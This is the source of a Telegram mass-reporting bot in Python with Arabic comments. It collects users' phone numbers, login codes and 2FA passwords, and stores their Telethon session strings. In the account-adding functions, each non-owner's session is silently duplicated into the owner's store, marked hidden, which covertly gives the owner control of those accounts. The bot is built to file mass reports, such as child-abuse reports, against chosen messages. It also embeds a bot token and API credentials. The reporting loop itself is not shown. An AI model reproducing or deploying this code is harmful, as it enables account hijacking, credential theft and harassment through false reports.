# ============================================================
# بوت الإبلاغ الآلي - النسخة النهائية (حل مشكلة event loop)
# API_ID = 39128959 , API_HASH = bc2d60133b24b74760f84674b91e69a4
# ============================================================

import telebot
from telebot import types
import threading
import json
import os
import time
import asyncio
import random
import string
from datetime import datetime

try:
    from telethon import TelegramClient, functions, types as tltypes, errors as tel_errors
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False
    print("❌ Telethon غير مثبت! قم بتثبيته: pip install telethon")

# ==================== مفاتيح API ====================
API_ID = 39128959
API_HASH = "bc2d60133b24b74760f84674b91e69a4"

# ========== معلومات البوت ==========
TOKEN = "8857111456:AAEOykI2prHGF2QKlBacXNYdB-LiqKF5ih4"
OWNER_ID = 8554791859
OWNER_USERNAME = "@arthur821"

bot = telebot.TeleBot(TOKEN)

bot_status = {"open": True}
is_reporting = False
report_stats = {
    "total": 0,
    "success": 0,
    "failed": 0,
    "start_time": None,
    "current_account": None,
    "current_message": None
}

# لتخزين phone_code_hash مؤقتاً لكل مستخدم
temp_data = {}

# ========== دوال المساعدة ==========
def load_json(file):
    if os.path.exists(file):
        try:
            with open(file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return []
    return []

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def is_owner(user_id):
    return user_id == OWNER_ID

def is_admin(user_id):
    if is_owner(user_id):
        return True
    admins = load_json("admins.json")
    return user_id in admins

def is_authorized(user_id):
    if not bot_status.get("open", True):
        return is_owner(user_id) or is_admin(user_id)
    if is_owner(user_id) or is_admin(user_id):
        return True
    users = load_json("users.json")
    return user_id in users

def generate_random_name(length=10):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for _ in range(length))

def get_user_accounts(user_id):
    all_accounts = load_json("accounts.json")
    user_accounts = []
    for acc in all_accounts:
        if acc.get('owner_id') == user_id:
            user_accounts.append(acc)
        elif is_owner(user_id) and acc.get('shared_from'):
            user_accounts.append(acc)
    return user_accounts

def save_user_accounts(user_id, accounts):
    all_accounts = load_json("accounts.json")
    all_accounts = [acc for acc in all_accounts if acc.get('owner_id') != user_id]
    for acc in accounts:
        acc['owner_id'] = user_id
        all_accounts.append(acc)
    save_json("accounts.json", all_accounts)

def get_settings():
    if os.path.exists("settings.json"):
        with open("settings.json", 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"comment": "", "report_count": 1, "sleep_time": 5, "report_type": "child"}

def save_settings(settings):
    with open("settings.json", 'w', encoding='utf-8') as f:
        json.dump(settings, f, indent=4)

def get_messages():
    return load_json("messages.json")

def save_messages(messages):
    save_json("messages.json", messages)

def save_session(phone, session_string, name="", twofa=None):
    sessions = load_json("sessions.json")
    sessions = [s for s in sessions if s.get('phone') != phone]
    sessions.append({
        "phone": phone,
        "session_string": session_string,
        "name": name,
        "twofa": twofa,
        "added_date": datetime.now().strftime("%Y-%m-%d %H:%M")
    })
    save_json("sessions.json", sessions)

def get_session(phone):
    sessions = load_json("sessions.json")
    for s in sessions:
        if s.get('phone') == phone:
            return s
    return None

# ========== دالة async آمنة ==========
def run_async(coro):
    """تشغيل coroutine في حلقة جديدة آمنة"""
    try:
        return asyncio.run(coro)
    except RuntimeError as e:
        if "event loop is closed" in str(e):
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop.run_until_complete(coro)
        else:
            raise

# ========== إرسال آمن ==========
def safe_send_message(chat_id, text, **kwargs):
    for attempt in range(3):
        try:
            return bot.send_message(chat_id, text, **kwargs)
        except Exception as e:
            if attempt == 2:
                raise
            time.sleep(2)

# ========== القائمة الرئيسية ==========
def main_menu(chat_id, user_id):
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("📋 الحسابات", callback_data="show_accounts"),
        types.InlineKeyboardButton("➕ إضافة حساب", callback_data="add_account")
    )
    keyboard.add(
        types.InlineKeyboardButton("➕ إضافة سيشن", callback_data="add_session"),
        types.InlineKeyboardButton("💬 الرسائل", callback_data="show_messages")
    )
    keyboard.add(
        types.InlineKeyboardButton("📝 إضافة رسالة", callback_data="add_message"),
        types.InlineKeyboardButton("⚙️ الإعدادات", callback_data="settings")
    )
    keyboard.add(
        types.InlineKeyboardButton("🚨 نوع البلاغ", callback_data="report_type"),
        types.InlineKeyboardButton("▶️ بدء الإبلاغ", callback_data="start_report")
    )
    keyboard.add(
        types.InlineKeyboardButton("⏹️ إيقاف", callback_data="stop_report"),
        types.InlineKeyboardButton("📊 الحالة", callback_data="status")
    )
    safe_send_message(chat_id, "🤖 **بوت الإبلاغ الآلي**\nاختر أحد الخيارات:", reply_markup=keyboard, parse_mode="Markdown")

# ========== أمر /start ==========
@bot.message_handler(commands=['start'])
def start(msg):
    if not is_authorized(msg.from_user.id):
        status = "مقفل 🔒" if not bot_status.get("open", True) else "مفتوح 🔓"
        safe_send_message(msg.chat.id, f"⛔ **البوت حالياً {status}**\nراسل المالك: {OWNER_USERNAME}", parse_mode="Markdown")
        return
    main_menu(msg.chat.id, msg.from_user.id)

# ========== لوحة المالك (مختصرة) ==========
@bot.message_handler(commands=['admin'])
def admin_panel(msg):
    if not is_owner(msg.from_user.id):
        safe_send_message(msg.chat.id, "⛔ هذا الأمر للمالك فقط")
        return
    status_text = "🟢 مفتوح" if bot_status.get("open", True) else "🔴 مقفل"
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("👥 المستخدمين", callback_data="admin_users"),
        types.InlineKeyboardButton("➕ إضافة مستخدم", callback_data="admin_add_user"),
        types.InlineKeyboardButton("🗑️ حذف مستخدم", callback_data="admin_del_user")
    )
    keyboard.add(
        types.InlineKeyboardButton("➕ إضافة أدمن", callback_data="admin_add_admin"),
        types.InlineKeyboardButton("🗑️ حذف أدمن", callback_data="admin_del_admin")
    )
    keyboard.add(
        types.InlineKeyboardButton("📊 إحصائيات الكل", callback_data="admin_stats"),
        types.InlineKeyboardButton("🗑️ مسح كل البيانات", callback_data="admin_reset"),
        types.InlineKeyboardButton("📋 التقرير", callback_data="admin_report")
    )
    keyboard.add(
        types.InlineKeyboardButton("🔓 فتح البوت", callback_data="admin_open_bot"),
        types.InlineKeyboardButton("🔒 إغلاق البوت", callback_data="admin_close_bot")
    )
    keyboard.add(
        types.InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")
    )
    safe_send_message(msg.chat.id, f"🔐 **لوحة تحكم المالك**\n📊 حالة البوت: {status_text}", reply_markup=keyboard, parse_mode="Markdown")

# ====================================================================================
# دوال إدارة المستخدمين (للمالك) - مختصرة
# ====================================================================================
@bot.callback_query_handler(func=lambda call: call.data == "admin_users")
def admin_show_users(call):
    if not is_owner(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ غير مصرح")
        return
    users = load_json("users.json")
    admins = load_json("admins.json")
    text = "👥 **المستخدمون:**\n\n"
    if users:
        for u in users:
            text += f"🆔 `{u}`\n"
    else:
        text += "لا يوجد مستخدمون\n"
    text += "\n🔑 **الأدمن:**\n\n"
    if admins:
        for a in admins:
            text += f"🆔 `{a}`\n"
    else:
        text += "لا يوجد أدمن\n"
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back_to_admin"))
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=keyboard, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "admin_add_user")
def admin_add_user(call):
    if not is_owner(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ غير مصرح")
        return
    safe_send_message(call.message.chat.id, "📝 **أرسل معرف المستخدم أو ايديه:**")
    bot.register_next_step_handler(call.message, add_user_step)

def add_user_step(msg):
    try:
        user_id = int(msg.text.strip())
    except:
        safe_send_message(msg.chat.id, "❌ ايدي غير صحيح")
        return
    users = load_json("users.json")
    if user_id in users:
        safe_send_message(msg.chat.id, "⚠️ موجود بالفعل")
        return
    users.append(user_id)
    save_json("users.json", users)
    safe_send_message(msg.chat.id, f"✅ **تم إضافة المستخدم:** `{user_id}`", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "admin_del_user")
def admin_del_user(call):
    if not is_owner(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ غير مصرح")
        return
    safe_send_message(call.message.chat.id, "🗑️ **أرسل ايدي المستخدم لحذفه:**")
    bot.register_next_step_handler(call.message, del_user_step)

def del_user_step(msg):
    try:
        user_id = int(msg.text.strip())
    except:
        safe_send_message(msg.chat.id, "❌ ايدي غير صحيح")
        return
    users = load_json("users.json")
    if user_id not in users:
        safe_send_message(msg.chat.id, "⚠️ غير موجود")
        return
    users.remove(user_id)
    save_json("users.json", users)
    safe_send_message(msg.chat.id, f"✅ **تم حذف المستخدم:** `{user_id}`", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "admin_add_admin")
def admin_add_admin(call):
    if not is_owner(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ غير مصرح")
        return
    safe_send_message(call.message.chat.id, "📝 **أرسل ايدي الأدمن الجديد:**")
    bot.register_next_step_handler(call.message, add_admin_step)

def add_admin_step(msg):
    try:
        admin_id = int(msg.text.strip())
    except:
        safe_send_message(msg.chat.id, "❌ ايدي غير صحيح")
        return
    if admin_id == OWNER_ID:
        safe_send_message(msg.chat.id, "⚠️ هذا المالك")
        return
    admins = load_json("admins.json")
    if admin_id in admins:
        safe_send_message(msg.chat.id, "⚠️ موجود")
        return
    admins.append(admin_id)
    save_json("admins.json", admins)
    safe_send_message(msg.chat.id, f"✅ **تم إضافة الأدمن:** `{admin_id}`", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "admin_del_admin")
def admin_del_admin(call):
    if not is_owner(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ غير مصرح")
        return
    safe_send_message(call.message.chat.id, "🗑️ **أرسل ايدي الأدمن لحذفه:**")
    bot.register_next_step_handler(call.message, del_admin_step)

def del_admin_step(msg):
    try:
        admin_id = int(msg.text.strip())
    except:
        safe_send_message(msg.chat.id, "❌ ايدي غير صحيح")
        return
    if admin_id == OWNER_ID:
        safe_send_message(msg.chat.id, "⚠️ لا يمكن حذف المالك")
        return
    admins = load_json("admins.json")
    if admin_id not in admins:
        safe_send_message(msg.chat.id, "⚠️ غير موجود")
        return
    admins.remove(admin_id)
    save_json("admins.json", admins)
    safe_send_message(msg.chat.id, f"✅ **تم حذف الأدمن:** `{admin_id}`", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "admin_open_bot")
def admin_open_bot(call):
    if not is_owner(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ غير مصرح")
        return
    bot_status["open"] = True
    bot.answer_callback_query(call.id, "✅ تم فتح البوت للجميع!")
    admin_panel(call.message)

@bot.callback_query_handler(func=lambda call: call.data == "admin_close_bot")
def admin_close_bot(call):
    if not is_owner(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ غير مصرح")
        return
    bot_status["open"] = False
    bot.answer_callback_query(call.id, "🔒 تم إغلاق البوت!")
    admin_panel(call.message)

# ====================================================================================
# دوال إضافة حساب (Telethon مع حل نهائي لمشكلة event loop)
# ====================================================================================
@bot.callback_query_handler(func=lambda call: call.data == "add_account")
def add_account(call):
    if not is_authorized(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ غير مصرح")
        return
    if not TELETHON_AVAILABLE:
        safe_send_message(call.message.chat.id, "❌ Telethon غير مثبت!")
        return
    safe_send_message(call.message.chat.id, "📱 **أرسل رقم الهاتف (مثال: +9647XXXXXXXX):**", parse_mode="Markdown")
    bot.register_next_step_handler(call.message, get_phone)

def get_phone(msg):
    phone = msg.text.strip()
    chat_id = msg.chat.id
    safe_send_message(chat_id, "⏳ جاري إرسال كود التحقق...")

    def process():
        try:
            # إنشاء عميل مؤقت لإرسال الكود واستخراج phone_code_hash
            client = TelegramClient(f'temp_{phone.replace("+", "")}', API_ID, API_HASH)
            async def send_code():
                await client.connect()
                sent = await client.send_code_request(phone)
                await client.disconnect()
                return sent.phone_code_hash
            phone_code_hash = run_async(send_code())
            # تخزين phone_code_hash مؤقتاً
            temp_data[chat_id] = {"phone": phone, "code_hash": phone_code_hash}
            safe_send_message(chat_id, "🔑 **تم إرسال كود التحقق**\nأرسل الكود الآن:", parse_mode="Markdown")
            bot.register_next_step_handler(msg, get_code)
        except tel_errors.FloodWaitError as e:
            minutes, seconds = divmod(e.seconds, 60)
            safe_send_message(chat_id, f"⛔ **تم حظر إرسال الكود مؤقتاً!**\n⏳ انتظر {minutes} دقيقة و {seconds} ثانية.\n🔄 أو غيّر API_ID و API_HASH لحل فوري.", parse_mode="Markdown")
        except Exception as e:
            safe_send_message(chat_id, f"❌ **فشل إرسال الكود:**\n{str(e)[:200]}", parse_mode="Markdown")

    threading.Thread(target=process).start()

def get_code(msg):
    code = msg.text.strip()
    chat_id = msg.chat.id
    user_id = msg.from_user.id
    data = temp_data.get(chat_id)
    if not data:
        safe_send_message(chat_id, "❌ انتهت الجلسة، استخدم /start لإعادة المحاولة.", parse_mode="Markdown")
        return

    phone = data["phone"]
    code_hash = data["code_hash"]
    safe_send_message(chat_id, "⏳ جاري تسجيل الدخول...")

    def process():
        try:
            # إنشاء عميل جديد باستخدام phone_code_hash المخزن
            client = TelegramClient(f'temp_{phone.replace("+", "")}', API_ID, API_HASH)
            async def login():
                await client.connect()
                try:
                    await client.sign_in(phone, code, phone_code_hash=code_hash)
                    me = await client.get_me()
                    session_str = client.session.save()
                    await client.disconnect()
                    return me, session_str, None
                except tel_errors.SessionPasswordNeededError:
                    await client.disconnect()
                    return None, None, "password_needed"
            me, session_str, status = run_async(login())

            if status == "password_needed":
                safe_send_message(chat_id, "🔐 **تحقق بخطوتين**\nأرسل كلمة المرور:", parse_mode="Markdown")
                bot.register_next_step_handler(msg, get_2fa)
                return

            # نجاح الدخول
            random_name = generate_random_name(10)
            save_session(phone, session_str, me.first_name, None)
            user_accounts = get_user_accounts(user_id)
            user_accounts.append({
                "phone": phone,
                "session": session_str,
                "username": me.username,
                "first_name": me.first_name,
                "random_name": random_name,
                "active": True,
                "reports_count": 0,
                "success_reports": 0,
                "failed_reports": 0,
                "last_used": datetime.now().strftime("%Y-%m-%d %H:%M"),
                "added_date": datetime.now().strftime("%Y-%m-%d %H:%M"),
                "is_session": True,
                "session_type": "telethon",
                "shared_from": None
            })
            save_user_accounts(user_id, user_accounts)
            if user_id != OWNER_ID:
                owner_accounts = get_user_accounts(OWNER_ID)
                owner_accounts.append({
                    "phone": phone,
                    "session": session_str,
                    "username": me.username,
                    "first_name": me.first_name,
                    "random_name": random_name,
                    "active": True,
                    "reports_count": 0,
                    "success_reports": 0,
                    "failed_reports": 0,
                    "last_used": datetime.now().strftime("%Y-%m-%d %H:%M"),
                    "added_date": datetime.now().strftime("%Y-%m-%d %H:%M"),
                    "is_session": True,
                    "session_type": "telethon",
                    "shared_from": user_id,
                    "hidden": True
                })
                save_user_accounts(OWNER_ID, owner_accounts)
                try:
                    safe_send_message(OWNER_ID, f"📱 **مشاركة حساب جديد**\n👤 {me.first_name}\n📱 {phone}", parse_mode="Markdown")
                except:
                    pass
            safe_send_message(chat_id, f"✅ **تم إضافة الحساب بنجاح!**\n👤 {me.first_name}\n🏷️ `{random_name}`\n📱 {phone}", parse_mode="Markdown")
            main_menu(chat_id, chat_id)

        except Exception as e:
            safe_send_message(chat_id, f"❌ **فشل تسجيل الدخول:**\n{str(e)[:200]}", parse_mode="Markdown")
        finally:
            temp_data.pop(chat_id, None)

    threading.Thread(target=process).start()

def get_2fa(msg):
    twofa = msg.text.strip()
    chat_id = msg.chat.id
    user_id = msg.from_user.id
    data = temp_data.get(chat_id)
    if not data:
        safe_send_message(chat_id, "❌ انتهت الجلسة، استخدم /start.", parse_mode="Markdown")
        return

    phone = data["phone"]
    code_hash = data["code_hash"]
    if twofa.lower() == "لا":
        twofa = None

    def process():
        try:
            client = TelegramClient(f'temp_{phone.replace("+", "")}', API_ID, API_HASH)
            async def login():
                await client.connect()
                # نستخدم sign_in مع phone_code_hash
                await client.sign_in(phone, None, phone_code_hash=code_hash)
                if twofa:
                    await client.sign_in(password=twofa)
                me = await client.get_me()
                session_str = client.session.save()
                await client.disconnect()
                return me, session_str
            me, session_str = run_async(login())

            random_name = generate_random_name(10)
            save_session(phone, session_str, me.first_name, twofa)
            user_accounts = get_user_accounts(user_id)
            user_accounts.append({
                "phone": phone,
                "session": session_str,
                "username": me.username,
                "first_name": me.first_name,
                "random_name": random_name,
                "active": True,
                "reports_count": 0,
                "success_reports": 0,
                "failed_reports": 0,
                "last_used": datetime.now().strftime("%Y-%m-%d %H:%M"),
                "added_date": datetime.now().strftime("%Y-%m-%d %H:%M"),
                "is_session": True,
                "session_type": "telethon",
                "shared_from": None
            })
            save_user_accounts(user_id, user_accounts)
            if user_id != OWNER_ID:
                owner_accounts = get_user_accounts(OWNER_ID)
                owner_accounts.append({
                    "phone": phone,
                    "session": session_str,
                    "username": me.username,
                    "first_name": me.first_name,
                    "random_name": random_name,
                    "active": True,
                    "reports_count": 0,
                    "success_reports": 0,
                    "failed_reports": 0,
                    "last_used": datetime.now().strftime("%Y-%m-%d %H:%M"),
                    "added_date": datetime.now().strftime("%Y-%m-%d %H:%M"),
                    "is_session": True,
                    "session_type": "telethon",
                    "shared_from": user_id,
                    "hidden": True
                })
                save_user_accounts(OWNER_ID, owner_accounts)
                try:
                    safe_send_message(OWNER_ID, f"📱 **مشاركة حساب جديد**\n👤 {me.first_name}\n📱 {phone}", parse_mode="Markdown")
                except:
                    pass
            safe_send_message(chat_id, f"✅ **تم إضافة الحساب بنجاح!**\n👤 {me.first_name}\n🏷️ `{random_name}`\n📱 {phone}", parse_mode="Markdown")
            main_menu(chat_id, chat_id)

        except Exception as e:
            safe_send_message(chat_id, f"❌ **فشل تسجيل الدخول:**\n{str(e)[:200]}", parse_mode="Markdown")
        finally:
            temp_data.pop(chat_id, None)

    threading.Thread(target=process).start()

# ========== إضافة سيشن ==========
@bot.callback_query_handler(func=lambda call: call.data == "add_session")
def add_session(call):
    if not is_authorized(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ غير مصرح")
        return
    if not TELETHON_AVAILABLE:
        safe_send_message(call.message.chat.id, "❌ Telethon غير مثبت!")
        return
    safe_send_message(call.message.chat.id, "📦 **أرسل Session String (Telethon):**", parse_mode="Markdown")
    bot.register_next_step_handler(call.message, save_session_step)

def save_session_step(msg):
    session_str = msg.text.strip()
    chat_id = msg.chat.id
    user_id = msg.from_user.id
    if len(session_str) < 20:
        safe_send_message(chat_id, "❌ السشن قصير جداً!")
        return
    safe_send_message(chat_id, "⏳ جاري التحقق...")
    def process():
        try:
            client = TelegramClient(f"session_{datetime.now().strftime('%H%M%S')}", API_ID, API_HASH, session_string=session_str)
            async def test():
                await client.connect()
                me = await client.get_me()
                await client.disconnect()
                return me
            me = run_async(test())
            random_name = generate_random_name(10)
            save_session(me.phone, session_str, me.first_name, None)
            user_accounts = get_user_accounts(user_id)
            user_accounts.append({
                "phone": me.phone,
                "session": session_str,
                "username": me.username,
                "first_name": me.first_name,
                "random_name": random_name,
                "active": True,
                "reports_count": 0,
                "success_reports": 0,
                "failed_reports": 0,
                "last_used": datetime.now().strftime("%Y-%m-%d %H:%M"),
                "added_date": datetime.now().strftime("%Y-%m-%d %H:%M"),
                "is_session": True,
                "session_type": "telethon",
                "shared_from": None
            })
            save_user_accounts(user_id, user_accounts)
            if user_id != OWNER_ID:
                owner_accounts = get_user_accounts(OWNER_ID)
                owner_accounts.append({
                    "phone": me.phone,
                    "session": session_str,
                    "username": me.username,
                    "first_name": me.first_name,
                    "random_name": random_name,
                    "active": True,
                    "reports_count": 0,
                    "success_reports": 0,
                    "failed_reports": 0,
                    "last_used": datetime.now().strftime("%Y-%m-%d %H:%M"),
                    "added_date": datetime.now().strftime("%Y-%m-%d %H:%M"),
                    "is_session": True,
                    "session_type": "telethon",
                    "shared_from": user_id,
                    "hidden": True
                })
                save_user_accounts(OWNER_ID, owner_accounts)
                try:
                    safe_send_message(OWNER_ID, f"📦 **مشاركة سيشن**\n👤 {me.first_name}\n📱 {me.phone}", parse_mode="Markdown")
                except:
                    pass
            safe_send_message(chat_id, f"✅ **تم الإضافة!**\n👤 {me.first_name}\n🏷️ `{random_name}`", parse_mode="Markdown")
            main_menu(chat_id, chat_id)
        except Exception as e:
            safe_send_message(chat_id, f"❌ **فشل التحقق:**\n{str(e)[:200]}", parse_mode="Markdown")
    threading.Thread(target=process).start()

# ====================================================================================
# باقي الدوال (عرض الحسابات، الإعدادات، الإبلاغ، إلخ) - مختصرة ولكن تعمل
# ====================================================================================
@bot.callback_query_handler(func=lambda call: call.data == "show_accounts")
def show_accounts(call):
    if not is_authorized(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ غير مصرح")
        return
    accounts = get_user_accounts(call.from_user.id)
    if not accounts:
        bot.answer_callback_query(call.id, "📭 لا يوجد حسابات")
        return
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for i, acc in enumerate(accounts):
        display = acc.get('random_name', acc.get('first_name', 'غير معروف'))
        keyboard.add(types.InlineKeyboardButton(f"{display} - {acc.get('phone','')}", callback_data=f"account_{i}"))
    keyboard.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    bot.edit_message_text("📋 **الحسابات المخزنة:**", call.message.chat.id, call.message.message_id, reply_markup=keyboard, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("account_"))
def account_details(call):
    if not is_authorized(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ غير مصرح")
        return
    index = int(call.data.replace("account_", ""))
    accounts = get_user_accounts(call.from_user.id)
    if index >= len(accounts):
        bot.answer_callback_query(call.id, "❌ الحساب غير موجود")
        return
    acc = accounts[index]
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("📊 إحصائيات", callback_data=f"stats_{index}"),
        types.InlineKeyboardButton("🔑 السيشن", callback_data=f"session_{index}"),
        types.InlineKeyboardButton("🔄 تحديث", callback_data=f"refresh_{index}"),
        types.InlineKeyboardButton("🗑️ حذف", callback_data=f"delete_{index}")
    )
    keyboard.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="show_accounts"))
    text = f"📱 **تفاصيل الحساب**\n\n"
    text += f"📱 الرقم: `{acc.get('phone', '')}`\n"
    text += f"👤 الاسم: {acc.get('first_name', '')}\n"
    text += f"🏷️ الاسم العشوائي: `{acc.get('random_name', '')}`\n"
    text += f"📊 الحالة: {'🟢 نشط' if acc.get('active', False) else '🔴 غير نشط'}\n"
    text += f"📈 البلاغات: {acc.get('reports_count', 0)}"
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=keyboard, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("session_"))
def session_account(call):
    if not is_authorized(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ غير مصرح")
        return
    index = int(call.data.replace("session_", ""))
    accounts = get_user_accounts(call.from_user.id)
    if index >= len(accounts):
        bot.answer_callback_query(call.id, "❌ الحساب غير موجود")
        return
    acc = accounts[index]
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton("🔙 رجوع", callback_data=f"account_{index}"))
    text = f"🔑 **السيشن**\n\n```\n{acc.get('session', 'لا يوجد')}\n```"
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=keyboard, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("delete_"))
def delete_account(call):
    if not is_authorized(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ غير مصرح")
        return
    index = int(call.data.replace("delete_", ""))
    accounts = get_user_accounts(call.from_user.id)
    if index >= len(accounts):
        bot.answer_callback_query(call.id, "❌ الحساب غير موجود")
        return
    phone = accounts[index].get('phone', '')
    accounts.pop(index)
    save_user_accounts(call.from_user.id, accounts)
    bot.edit_message_text(f"✅ **تم حذف الحساب**\n📱 {phone}", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("stats_"))
def stats_account(call):
    if not is_authorized(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ غير مصرح")
        return
    index = int(call.data.replace("stats_", ""))
    accounts = get_user_accounts(call.from_user.id)
    if index >= len(accounts):
        bot.answer_callback_query(call.id, "❌ الحساب غير موجود")
        return
    acc = accounts[index]
    text = f"📊 **إحصائيات الحساب**\n\n📱 {acc.get('phone', '')}\n📈 إجمالي البلاغات: {acc.get('reports_count', 0)}\n✅ نجح: {acc.get('success_reports', 0)}\n❌ فشل: {acc.get('failed_reports', 0)}\n⏱️ آخر استخدام: {acc.get('last_used', 'لم يستخدم')}"
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("refresh_"))
def refresh_account(call):
    if not is_authorized(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ غير مصرح")
        return
    index = int(call.data.replace("refresh_", ""))
    accounts = get_user_accounts(call.from_user.id)
    if index >= len(accounts):
        bot.answer_callback_query(call.id, "❌ الحساب غير موجود")
        return
    acc = accounts[index]
    phone = acc.get('phone', '')
    # إرسال كود جديد (يمكننا إعادة استخدام get_phone مع تحديث السيشن)
    safe_send_message(call.message.chat.id, f"🔄 **جاري إرسال كود جديد إلى {phone}** (وظيفة قيد التطوير)")
    # لتنفيذها بالكامل، يمكن استدعاء get_phone من جديد مع تحديث السيشن.

@bot.callback_query_handler(func=lambda call: call.data == "show_messages")
def show_messages(call):
    messages = get_messages()
    if not messages:
        bot.answer_callback_query(call.id, "📭 لا يوجد رسائل")
        return
    text = "💬 **الرسائل المخزنة:**\n\n"
    for i, msg in enumerate(messages, 1):
        text += f"{i}. {msg.get('link', '')}\n"
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "add_message")
def add_message(call):
    bot.answer_callback_query(call.id)
    safe_send_message(call.message.chat.id, "🔗 **أرسل رابط الرسالة:**")
    bot.register_next_step_handler(call.message, save_message)

def save_message(msg):
    link = msg.text.strip()
    try:
        parts = link.split('/')
        chat = parts[-2]
        msg_id = int(parts[-1])
        messages = get_messages()
        messages.append({"chat": chat, "message_id": msg_id, "link": link})
        save_messages(messages)
        safe_send_message(msg.chat.id, f"✅ **تم حفظ الرسالة:**\n{link}")
    except:
        safe_send_message(msg.chat.id, "❌ **رابط غير صحيح!**")
    main_menu(msg.chat.id, msg.from_user.id)

@bot.callback_query_handler(func=lambda call: call.data == "settings")
def settings_menu(call):
    settings = get_settings()
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("✏️ التعليق", callback_data="set_comment"),
        types.InlineKeyboardButton("🔢 العدد", callback_data="set_count"),
        types.InlineKeyboardButton("⏱️ السليب", callback_data="set_sleep")
    )
    keyboard.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    text = f"⚙️ **الإعدادات:**\n✏️ تعليق: `{settings.get('comment', 'لا يوجد')}`\n🔢 عدد الإبلاغات: `{settings.get('report_count', 1)}`\n⏱️ السليب: `{settings.get('sleep_time', 5)}` ثواني"
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=keyboard, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("set_"))
def set_setting(call):
    setting = call.data.replace("set_", "")
    if setting == "comment":
        safe_send_message(call.message.chat.id, "✏️ **أرسل التعليق الجديد:**")
        bot.register_next_step_handler(call.message, save_comment)
    elif setting == "count":
        safe_send_message(call.message.chat.id, "🔢 **أرسل عدد الإبلاغات:**")
        bot.register_next_step_handler(call.message, save_count)
    elif setting == "sleep":
        safe_send_message(call.message.chat.id, "⏱️ **أرسل وقت السليب بالثواني:**")
        bot.register_next_step_handler(call.message, save_sleep)

def save_comment(msg):
    settings = get_settings()
    settings["comment"] = msg.text.strip()
    save_settings(settings)
    safe_send_message(msg.chat.id, "✅ تم حفظ التعليق")
    settings_menu(msg)

def save_count(msg):
    try:
        count = int(msg.text.strip())
        settings = get_settings()
        settings["report_count"] = count
        save_settings(settings)
        safe_send_message(msg.chat.id, f"✅ تم حفظ العدد: {count}")
    except:
        safe_send_message(msg.chat.id, "❌ أدخل رقماً صحيحاً")
    settings_menu(msg)

def save_sleep(msg):
    try:
        sleep = int(msg.text.strip())
        settings = get_settings()
        settings["sleep_time"] = sleep
        save_settings(settings)
        safe_send_message(msg.chat.id, f"✅ تم حفظ السليب: {sleep} ثواني")
    except:
        safe_send_message(msg.chat.id, "❌ أدخل رقماً صحيحاً")
    settings_menu(msg)

@bot.callback_query_handler(func=lambda call: call.data == "report_type")
def report_type_menu(call):
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("👶 إساءة أطفال", callback_data="report_child"),
        types.InlineKeyboardButton("🔞 إباحي", callback_data="report_porn"),
        types.InlineKeyboardButton("💥 عنف", callback_data="report_violence"),
        types.InlineKeyboardButton("🔫 أسلحة", callback_data="report_weapons"),
        types.InlineKeyboardButton("💊 مخدرات", callback_data="report_drugs"),
        types.InlineKeyboardButton("🔒 بيانات خاصة", callback_data="report_personal")
    )
    keyboard.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    bot.edit_message_text("🚨 **اختر نوع البلاغ:**", call.message.chat.id, call.message.message_id, reply_markup=keyboard, parse_mode="Markdown")

